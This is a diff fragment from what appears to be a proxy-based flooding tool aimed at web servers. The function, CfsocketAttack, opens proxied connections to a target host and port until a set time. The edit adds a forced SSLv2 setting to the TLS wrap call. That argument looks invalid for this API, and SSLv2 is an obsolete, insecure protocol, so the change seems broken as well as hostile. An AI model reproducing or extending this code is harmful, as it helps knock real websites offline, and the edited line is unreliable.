@@ -658,7 +658,7 @@ def CfsocketAttack(until_datetime, target, req, px):
         packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         packet.connect((str(target['host']), int(target['port'])))
-        packet=ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+        packet=ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'], ssl_version=ssl.PROTOCOL_SSLv2)
     else:
         packet=socks.socksocket()
         packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
